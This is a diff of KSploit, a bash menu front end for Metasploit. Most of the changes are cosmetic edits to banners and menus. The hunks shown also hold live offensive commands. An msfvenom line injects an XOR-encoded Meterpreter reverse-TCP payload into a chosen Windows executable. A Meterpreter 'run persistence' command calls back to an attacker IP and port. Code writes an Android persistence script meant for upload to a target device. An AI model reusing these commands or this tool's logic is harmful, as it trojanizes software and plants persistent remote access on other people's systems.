@@ -53,25 +53,25 @@ ITALIC="${C}[3m"
 ###############################################
 locals()
 {
-	echo "               ${FGC}| Your current adapter address(es)  |${NC}${YELLOW}"
-	if [ -z "$EADDR" ]  &&  [ -z "$ADDR" ]  &&  [ -z "$WADDR" ];
-	then
-	   echo "               ${FGR}|       ⚠️   NOT CONNECTED   ⚠️       |${NC}${YELLOW}"
-	fi
-	if [ -n "${EADDR}" ];
-	then
-	  echo "               | ETH0: $EADDR"| sed 's/$/ /g'
-	fi
-	if [ -n "${ADDR}" ]; 
-	then
-	   echo "               | TUN0: $ADDR"| sed 's/$/ /g'
-	fi 
-	if [ -n "${WADDR}" ]; 
-	then
-	   echo "               | WLAN0: $WADDR"| sed 's/$/ /g'
-	fi
-           echo "               -------------------------------------"
-	return 
+    echo "               ${FGC}| Your current adapter address(es)  |${NC}${YELLOW}"
+    if [ -z "$EADDR" ]  &&  [ -z "$ADDR" ]  &&  [ -z "$WADDR" ];
+      then
+       echo "               ${FGR}|       ⚠️   NOT CONNECTED   ⚠️       |${NC}${YELLOW}"
+    fi
+    if [ -n "${EADDR}" ];
+      then
+       echo "               | ETH0: $EADDR"| sed 's/$/ /g'
+    fi
+    if [ -n "${ADDR}" ]; 
+      then
+       echo "               | TUN0: $ADDR"| sed 's/$/ /g'
+    fi 
+    if [ -n "${WADDR}" ]; 
+      then
+       echo "               | WLAN0: $WADDR"| sed 's/$/ /g'
+    fi
+    echo "               -------------------------------------"
+    return 
 }
 
 ################################################################################
@@ -81,19 +81,18 @@ shells()
 {    
 clear
 echo ${YELLOW}"
-	 ____  _          _ _     
-	/ ___|| |__   ___| | |___ 
-	\___ \| '_ \ / _ \ | / __|
-	 ___) | | | |  __/ | \__ \\
-	|____/|_| |_|\___|_|_|___/
-	 🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚                          
-	"
-   echo "${LIGHT_MAGENTA}  Use the shells menu to quickly and easily craft shell code and scripts.${YELLOW}"
+   ____  _          _ _     
+  / ___|| |__   ___| | |___ 
+  \___ \| '_ \ / _ \ | / __|
+   ___) | | | |  __/ | \__ \\
+  |____/|_| |_|\___|_|_|___/
+   🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚                          
+	"${LIGHT_MAGENTA}
+   echo "  Use the shells menu to quickly and easily craft shell code and scripts. Choose from Bash, PERL, Ruby, PHP, python and necat options.  ${YELLOW}" |fmt -w 60
+   echo
    echo ${YELLOW}
-   echo "     if you need an advanced php shell, go here:    "
-   echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}"
    echo "	   _____________________________________________"
-   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |${FGG}       KSploit Shells Menu Options:          ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🐚${GREEN} 1 ${BLUE}Bash shell script.                  ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -112,6 +111,8 @@ echo ${YELLOW}"
    echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|"
    echo
+   echo "     if you need an advanced php shell, go here:    "
+   echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" |fmt -w 80
    if [ ! "${error}" = "" ]
     then
      echo "${LG}"
@@ -242,18 +243,19 @@ payloads()
 {
 	clear
 	echo ${LIGHT_CYAN}'
-	 ____             _                 _     
-	|  _ \ __ _ _   _| | ___   __ _  __| |___ 
-	| |_) / _` | | | | |/ _ \ / _` |/ _` / __|
-	|  __/ (_| | |_| | | (_) | (_| | (_| \__ \
-	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
-		    |___/                         
-	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
- '
-   echo "${LIGHT_MAGENTA}  Use the payloads menu to quickly and easily craft metasploit payloads."
+   ____             _                 _     
+  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
+  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
+  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
+  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
+	      |___/                         
+   💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
+ '${LIGHT_MAGENTA} 
+   echo "  Use the payloads menu to quickly and easily craft metasploit payloads for a wide variety of targets." |fmt -w 60
+   echo
    echo ${YELLOW}
    echo "	   _____________________________________________"
-   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |${FGG}        KSploit Payloads Menu Options:       ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Payloads.                   ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -338,18 +340,19 @@ linpayloads()
 {
 	clear
 	echo ${LIGHT_CYAN}'
-	 ____             _                 _        
-	|  _ \ __ _ _   _| | ___   __ _  __| |___ 
-	| |_) / _` | | | | |/ _ \ / _` |/ _` / __|
-	|  __/ (_| | |_| | | (_) | (_| | (_| \__ \
-	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
-		    |___/                         
-	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
-'
-   echo "${LIGHT_MAGENTA}  Use the payloadss menu to quickly and easily craft metasploit payloads."
+   ____             _                 _        
+  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
+  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
+  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
+  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
+	      |___/                         
+   🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧	    
+'${LIGHT_MAGENTA}
+   echo "  Use the linux payloads menu to quickly and easily craft metasploit payloads for linux targets." |fmt -w 60
+   echo
    echo ${YELLOW}
    echo "	   _____________________________________________"
-   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |${FGG}      KSploit Linux Payloads Menu Options:   ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🐧${GREEN} 1 ${BLUE}Linux x86 Meterpreter Reverse TCP.  ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -411,18 +414,19 @@ winpayloads()
 {
 	clear
 	echo ${LIGHT_CYAN}'
-	 ____             _                 _        
-	|  _ \ __ _ _   _| | ___   __ _  __| |___ 
-	| |_) / _` | | | | |/ _ \ / _` |/ _` / __|
-	|  __/ (_| | |_| | | (_) | (_| | (_| \__ \
-	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
-		    |___/                         
-	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
-'
-   echo "${LIGHT_MAGENTA}  Use the payloadss menu to quickly and easily craft metasploit payloads."
+   ____             _                 _        
+  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
+  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
+  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
+  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
+  	      |___/                         
+   🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️	    
+'${LIGHT_MAGENTA}
+   echo "  Use the windows payloads menu to quickly and easily craft metasploit payloads for windows targets." |fmt -w 60
+   echo
    echo ${YELLOW}
    echo "	   _____________________________________________"
-   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |${FGG}    KSploit Windows Payloads Menu Options:   ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows x86 Meterpreter Reverse TCP.${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -486,17 +490,18 @@ listeners()
 {
         clear
 echo ${LIGHT_CYAN}'
-	 _     _     _                           
-	| |   (_)___| |_ ___ _ __   ___ _ __ ___ 
-	| |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
-	| |___| \__ \ ||  __/ | | |  __/ |  \__ \
-	|_____|_|___/\__\___|_| |_|\___|_|  |___/
-	 👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂
-'
-   echo "${LIGHT_MAGENTA}  Use the listeners menu to craft and quickly deploy metasploit listeners."
+   _     _     _                           
+  | |   (_)___| |_ ___ _ __   ___ _ __ ___ 
+  | |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
+  | |___| \__ \ ||  __/ | | |  __/ |  \__ \
+  |_____|_|___/\__\___|_| |_|\___|_|  |___/
+   👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂
+'${LIGHT_MAGENTA}
+   echo "  Use the listeners menu to craft and quickly deploy metasploit listeners." |fmt -w 60
+   echo
    echo ${YELLOW}
    echo "	   _____________________________________________"
-   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |${FGG}      KSploit Listeners Menu Options:        ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Meterpreter Reverse TCP.    ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -640,38 +645,26 @@ persist()
 {
 clear
 echo ${LIGHT_CYAN} 
-echo " ____               _     _                      "
-echo "|  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
-echo "| |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
-echo "|  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
-echo "|_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
+echo "   ____               _     _                      "
+echo "  |  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
+echo "  | |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
+echo "  |  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
+echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
+echo "  ⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛"
+echo ${LIGHT_MAGENTA} 
+echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." |fmt -w 60
 echo
-echo "${LIGHT_MAGENTA}  Use the persistence menu to quickly forge persistence scripts."
 echo ${YELLOW}
 echo "	   _____________________________________________"
-echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+echo "	  |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
 echo "	  |---------------------------------------------|"
 echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Persitence Script.          ${YELLOW}|"
 echo "	  |---------------------------------------------|"
-echo "	  |    🤖${GREEN} 4 ${BLUE}Android Persistence Script.         ${YELLOW}|"
+echo "	  |    🤖${GREEN} 2 ${BLUE}Android Persistence Script.         ${YELLOW}|"
 echo "	  |---------------------------------------------|"
 echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
 echo "	  |_____________________________________________${YELLOW}|${GREEN}"
 echo	
-
-
-
-#	echo
-#	echo 
-#	echo -e "${RED} ##################################################"
-#	echo -e " #${FGR}${LG}             💀   NOT READY!!!!   💀            ${NC}${RED}#" 
-#	echo -e " ##################################################"
-#	echo
-#	echo
-#	sleep 1
-#	clear
-#	goto start;
-#  exit 1; 
    if [ ! "${error}" = "" ]
     then
      echo "${LG}"
@@ -692,9 +685,9 @@ echo
     	  read -p '	    Set Callback Interval* ' attinterval
 	  echo
           echo 
-          echo -e "          |  ${GREEN}  ⌛⌛⌛ Your Persistence Script :     ${NC}${YELLOW}"                                                    
-    	  echo -e "          |                                                                "  
-          echo -e "          |    ---> run persistence -U -X -i $attinterval -r $attackerip -p $attackerport       ${NC}${YELLOW}        " 
+          echo -e "             ${GREEN}  ⌛⌛⌛ Your Persistence Script :     ${NC}${YELLOW}"                                                    
+    	  echo -e "                                                                          "  
+          echo -e " ${FGC} run persistence -U -X -i $attinterval -r $attackerip -p $attackerport ${NC}${YELLOW} " | fmt -s -w 80
   	  echo 
 	  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
 	  exit 1
@@ -708,7 +701,6 @@ echo
           echo "sleep 20" >> $wdir/android.sh
           echo "done" >> $wdir/android.sh
           sleep 2
-#          cat $wdir/android.sh
           echo 
           echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
           echo -e "                Upload it to / on target android device${NC}" 
@@ -726,7 +718,6 @@ echo
           persist
 	;;
     esac
-
 }
 
 ################################################################################
@@ -750,7 +741,7 @@ malexe()
 	echo
 	echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
 	echo
-	   locals
+	locals
 	echo ${LIGHT_CYAN}
 	read -p '   	       Set Attacker IP* ' attackerip
 	read -p '   	       Set Attacker Port* ' attackerport
@@ -762,6 +753,7 @@ malexe()
 	echo -e "               💉💉💉 Injecting payload into $outputname ..."
 	echo $exepath
 	sleep 2
+	echo "msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe" | fmt 
 	echo `msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe -o $wdir/$outputname`
 	echo -e "         ${FGG}${YELLOW}   💉💉💉   $wdir/$outputname saved   💉💉💉   ${NC}${LIGHT_CYAN}" &
 	sleep 40
@@ -788,84 +780,6 @@ clear
   exit 1; 
 }
 
-printf "\e[49m                                                \e[m
-\e[49m                                                \e[m
-\e[49m                \e[38;5;65;49m▄\e[38;5;71;49m▄\e[38;5;71;48;5;0m▄\e[38;5;71;48;5;65m▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m     \e[38;5;71;48;5;71m▄\e[38;5;71;48;5;65m▄\e[38;5;71;48;5;0m▄\e[38;5;71;49m▄\e[38;5;239;49m▄\e[49m                \e[m
-\e[49m             \e[38;5;238;49m▄\e[38;5;71;48;5;234m▄\e[38;5;71;48;5;71m▄▄▄▄▄▄\e[48;5;71m     \e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄▄▄▄\e[38;5;71;48;5;233m▄\e[38;5;235;49m▄\e[49m             \e[m
-\e[49m           \e[38;5;0;49m▄\e[38;5;71;48;5;239m▄\e[38;5;71;48;5;71m▄▄▄▄\e[48;5;71m                \e[38;5;71;48;5;71m▄▄\e[38;5;71;48;5;236m▄\e[49m            \e[m
-\e[49m          \e[38;5;235;49m▄\e[38;5;71;48;5;71m▄▄▄\e[48;5;71m                     \e[38;5;71;48;5;71m▄▄\e[38;5;236;49m▄\e[49m          \e[m
-\e[49m          \e[38;5;71;48;5;71m▄▄▄\e[48;5;71m                        \e[38;5;71;48;5;71m▄\e[49m          \e[m
-\e[49m         \e[38;5;71;48;5;65m▄\e[48;5;71m                           \e[38;5;71;48;5;71m▄\e[38;5;71;48;5;235m▄\e[49m         \e[m
-\e[49m         \e[38;5;71;48;5;71m▄\e[48;5;71m                           \e[38;5;71;48;5;71m▄▄\e[49m         \e[m
-\e[49m         \e[38;5;71;48;5;71m▄\e[48;5;71m                             \e[49m         \e[m
-\e[49m         \e[38;5;71;48;5;71m▄▄▄▄▄▄▄▄▄▄▄▄\e[48;5;71m       \e[38;5;71;48;5;71m▄▄▄▄▄▄▄▄▄▄▄\e[49m         \e[m
-\e[49m         \e[38;5;71;48;5;71m▄▄\e[38;5;0;48;5;71m▄\e[38;5;232;48;5;240m▄\e[48;5;0m    \e[38;5;0;48;5;235m▄\e[38;5;71;48;5;71m▄\e[38;5;65;48;5;71m▄\e[38;5;71;48;5;71m▄▄▄\e[48;5;71m   \e[38;5;71;48;5;71m▄▄▄\e[38;5;65;48;5;71m▄\e[38;5;236;48;5;35m▄\e[38;5;71;48;5;71m▄\e[38;5;242;48;5;71m▄\e[38;5;0;48;5;71m▄\e[38;5;0;48;5;35m▄\e[38;5;0;48;5;71m▄\e[38;5;65;48;5;71m▄\e[38;5;71;48;5;71m▄▄\e[49m         \e[m
-\e[49m         \e[38;5;232;48;5;65m▄\e[38;5;71;48;5;71m▄\e[48;5;0m     \e[38;5;0;48;5;0m▄\e[38;5;242;48;5;238m▄\e[38;5;255;48;5;0m▄\e[38;5;0;48;5;71m▄\e[38;5;108;48;5;65m▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m   \e[38;5;71;48;5;71m▄\e[38;5;65;48;5;71m▄\e[38;5;65;48;5;234m▄\e[38;5;0;48;5;71m▄\e[38;5;15;48;5;233m▄\e[38;5;234;48;5;248m▄\e[48;5;0m    \e[38;5;234;48;5;0m▄\e[38;5;71;48;5;71m▄\e[49;38;5;239m▀\e[49m         \e[m
-\e[49m          \e[38;5;65;48;5;71m▄\e[38;5;71;48;5;234m▄\e[48;5;0m       \e[38;5;0;48;5;234m▄\e[38;5;0;48;5;232m▄\e[38;5;71;48;5;239m▄\e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;65;48;5;71m▄\e[38;5;232;48;5;243m▄\e[48;5;0m  \e[38;5;0;48;5;233m▄\e[38;5;0;48;5;0m▄\e[48;5;0m    \e[38;5;71;48;5;65m▄\e[38;5;233;48;5;71m▄\e[49m          \e[m
-\e[49m           \e[38;5;71;48;5;71m▄\e[38;5;237;48;5;0m▄\e[38;5;8;48;5;0m▄\e[48;5;0m       \e[38;5;0;48;5;65m▄\e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;65;48;5;71m▄\e[48;5;0m       \e[38;5;232;48;5;0m▄\e[38;5;71;48;5;0m▄\e[38;5;65;48;5;71m▄\e[49m           \e[m
-\e[49m            \e[38;5;243;48;5;71m▄\e[38;5;108;48;5;0m▄\e[38;5;65;48;5;243m▄\e[38;5;71;48;5;0m▄\e[48;5;0m      \e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[48;5;0m      \e[38;5;71;48;5;0m▄\e[38;5;0;48;5;237m▄\e[38;5;71;48;5;232m▄\e[38;5;0;48;5;71m▄\e[49m            \e[m
-\e[49m             \e[38;5;232;48;5;71m▄\e[38;5;71;48;5;71m▄\e[38;5;71;48;5;234m▄\e[38;5;71;48;5;71m▄▄\e[38;5;71;48;5;236m▄\e[38;5;71;48;5;232m▄\e[38;5;71;48;5;240m▄\e[38;5;71;48;5;238m▄\e[38;5;71;48;5;243m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;71;48;5;239m▄\e[38;5;71;48;5;238m▄\e[38;5;71;48;5;235m▄\e[38;5;71;48;5;238m▄\e[38;5;243;48;5;71m▄\e[38;5;71;48;5;71m▄\e[38;5;71;48;5;233m▄\e[38;5;71;48;5;71m▄\e[49;38;5;108m▀\e[49m             \e[m
-\e[49m              \e[49;38;5;239m▀\e[38;5;71;48;5;71m▄▄\e[48;5;71m     \e[38;5;71;48;5;71m▄\e[38;5;233;48;5;71m▄▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m   \e[38;5;71;48;5;71m▄▄\e[38;5;239;48;5;71m▄\e[49;38;5;232m▀\e[49m              \e[m
-\e[49m                \e[49;38;5;71m▀\e[38;5;243;48;5;71m▄\e[38;5;71;48;5;71m▄\e[48;5;71m   \e[38;5;71;48;5;71m▄\e[38;5;71;48;5;236m▄\e[38;5;71;48;5;65m▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;65;48;5;71m▄\e[49;38;5;242m▀\e[49m                \e[m
-\e[49m                  \e[49;38;5;65m▀\e[38;5;71;48;5;71m▄▄▄▄▄▄▄▄▄\e[38;5;65;48;5;71m▄\e[49;38;5;242m▀\e[49m                  \e[m
-\e[49m                    \e[49;38;5;71m▀\e[38;5;71;48;5;71m▄▄▄▄▄▄\e[49;38;5;71m▀\e[49m                    \e[m
-\e[49m                      \e[38;5;0;48;5;71m▄\e[38;5;71;48;5;71m▄▄\e[49;38;5;71m▀\e[49m                      \e[m
-\e[49m                                                \e[m
-\e[49m                                                \e[m
-";printf "
-    \e[49m                                        \e[m
-    \e[49m  \e[38;5;82;49m▄▄▄▄▄▄▄▄▄\e[38;5;82;48;5;82m▄▄\e[38;5;82;49m▄▄\e[49m      \e[38;5;82;49m▄\e[38;5;82;48;5;82m▄▄\e[38;5;82;49m▄\e[49m     \e[38;5;82;49m▄\e[38;5;82;48;5;82m▄▄\e[38;5;82;49m▄▄▄▄\e[49m   \e[m
-    \e[49m  \e[38;5;82;48;5;82m▄\e[38;5;234;48;5;234m▄\e[48;5;232m \e[38;5;233;48;5;82m▄\e[38;5;235;48;5;233m▄\e[38;5;82;48;5;235m▄\e[38;5;82;48;5;82m▄\e[48;5;82m \e[38;5;235;48;5;234m▄\e[38;5;82;48;5;234m▄\e[38;5;82;48;5;233m▄\e[38;5;82;48;5;234m▄\e[38;5;82;48;5;82m▄▄\e[38;5;232;48;5;82m▄▄\e[38;5;233;48;5;82m▄▄\e[38;5;82;48;5;82m▄▄\e[48;5;232m \e[48;5;233m \e[38;5;82;48;5;82m▄▄\e[38;5;232;48;5;82m▄\e[38;5;233;48;5;82m▄▄\e[38;5;82;48;5;82m▄\e[48;5;82m \e[38;5;232;48;5;232m▄\e[38;5;232;48;5;233m▄\e[38;5;82;48;5;82m▄\e[38;5;233;48;5;22m▄\e[38;5;236;48;5;234m▄\e[38;5;232;48;5;82m▄▄\e[38;5;82;49m▄\e[49m \e[m
-    \e[49m  \e[48;5;82m \e[38;5;234;48;5;234m▄\e[38;5;233;48;5;236m▄\e[38;5;236;48;5;235m▄\e[38;5;233;48;5;82m▄\e[38;5;82;48;5;82m▄\e[48;5;82m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;235m▄▄\e[38;5;232;48;5;233m▄\e[38;5;237;48;5;232m▄\e[38;5;232;48;5;82m▄\e[48;5;82m \e[48;5;234m \e[38;5;232;48;5;234m▄\e[38;5;82;48;5;82m▄\e[38;5;82;48;5;233m▄\e[38;5;235;48;5;234m▄\e[38;5;82;48;5;82m▄\e[48;5;232m \e[48;5;233m \e[38;5;82;48;5;82m▄\e[38;5;234;48;5;233m▄\e[38;5;232;48;5;234m▄\e[38;5;82;48;5;82m▄\e[38;5;82;48;5;233m▄\e[38;5;236;48;5;234m▄\e[38;5;82;48;5;82m▄\e[38;5;232;48;5;232m▄\e[48;5;234m \e[38;5;82;48;5;82m▄\e[38;5;22;48;5;22m▄\e[48;5;234m \e[38;5;82;48;5;82m▄▄\e[49;38;5;82m▀\e[49m \e[m
-    \e[49m  \e[38;5;82;48;5;82m▄\e[38;5;234;48;5;234m▄\e[48;5;232m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;236m▄\e[38;5;234;48;5;233m▄\e[38;5;233;48;5;82m▄\e[48;5;82m \e[38;5;233;48;5;82m▄\e[38;5;234;48;5;82m▄▄\e[38;5;233;48;5;234m▄\e[38;5;82;48;5;232m▄\e[38;5;82;48;5;82m▄\e[38;5;234;48;5;234m▄\e[38;5;232;48;5;233m▄\e[38;5;234;48;5;82m▄\e[38;5;234;48;5;232m▄\e[38;5;28;48;5;235m▄\e[38;5;82;48;5;82m▄\e[48;5;232m \e[48;5;233m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;234m▄\e[38;5;234;48;5;233m▄\e[38;5;234;48;5;82m▄\e[38;5;234;48;5;233m▄\e[38;5;82;48;5;235m▄\e[38;5;82;48;5;82m▄\e[38;5;232;48;5;232m▄\e[48;5;234m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;2m▄\e[38;5;234;48;5;234m▄\e[38;5;234;48;5;82m▄\e[38;5;34;48;5;82m▄\e[38;5;82;48;5;82m▄\e[49m \e[m
-    \e[49m  \e[49;38;5;82m▀▀▀▀▀▀▀▀▀▀▀▀▀\e[38;5;82;48;5;82m▄\e[38;5;233;48;5;234m▄\e[38;5;232;48;5;232m▄\e[38;5;82;48;5;82m▄\e[49;38;5;82m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[49m  \e[m
-    \e[49m               \e[49;38;5;82m▀▀▀\e[49m                      \e[m
-";
-echo -ne '   👽\r'
-sleep .1
-echo -ne '   👽👽\r'
-sleep .1
-echo -ne '   👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .1
-echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-echo -ne ${FGC}${YELLOW}'                    🕵🔎 Courtesy of KaotickJ 👽\r'${NC}
-sleep 2
-clear
-
 ################################################################################
 ################################################################################
 # Main program                                                                 #
@@ -879,38 +793,85 @@ function goto
     eval "$cmd"
     exit
 }
-
-start=${1:-"start"}
-#start:
+function pause(){
+   read -p "$*"
+}
    echo
    echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
    echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
    echo "    ${RED}| ' /${LIGHT_MAGENTA}\\___ \| '_ \| |/ _ \| | __|"
    echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
    echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
-   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "
-   echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
+   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "${FGC}${YELLOW};
+   echo -ne '   👽\r'
+   sleep .1
+   echo -ne '   👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   sleep .1
+   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+   echo -ne '                    🕵🔎 Courtesy of KaotickJ 👽\r'${NC}
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
+   echo "${LIGHT_MAGENTA}  "
+   echo
+   echo "  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits" |fmt -w 60
    echo 
